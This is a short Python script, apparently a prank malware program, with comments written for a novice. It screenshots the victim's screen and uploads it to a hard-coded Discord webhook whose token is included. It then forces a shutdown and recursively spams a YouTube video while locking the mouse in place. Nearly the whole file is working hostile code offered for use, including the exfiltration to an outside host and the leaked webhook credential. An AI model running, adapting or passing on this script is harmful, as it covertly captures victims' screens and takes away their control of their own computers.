#the imports that this code uses
import os, webbrowser, mouse, time, pyautogui, requests, gtts

#Discord webhook url CHANGE THIS TO YOURS IF YOU WANT THE SCREENSHOT
discordwebhookurl = "https://discord.com/api/webhooks/1216813372272676895/qFPPKXxMuCEKsDCvhIxWzwVp2P1mg6GjckQ3Oc7e_9mG7CpdiXOKFExNOqIDKI-GQDLT"

#takes a screenshot
grabscreen = pyautogui.screenshot()
#says what the file name for the screen shot should be
grabpath = "screengrab.png"
#saves the screenshot
grabscreen.save(grabpath)

#defines what file to send
discordsendfile = {"file" : (grabpath, open(grabpath, "rb"))}
#content is what the message says and username is the name it gives the webhook bot
discorddata = {
    "content": "Screenshot",
    "username": "MeAtTheZoo"
}

#sends over the screen shot to the discord web hook
response = requests.post(discordwebhookurl, files=discordsendfile, data=discorddata)
#checks if it was sent
if response.status_code == 204:
    print("screen grab sent")

#turns off your pc in 60 seconds
os.system("shutdown /s /t 60")

#locks mouse and spams open me at the zoo on youtube
def mouselock():
    #opens me at the zoo
    webbrowser.open_new("https://www.youtube.com/watch?v=jNQXAC9IVRw")
    #locks the mouse to theese cords on your screen
    mouse.move (500, 200)
    #gives the computer a break
    time.sleep (0.005)
    #loops this code
    mouselock()
    
#runs mouse lock (spams open me at the zoo and locks your mouse in place)
mouselock()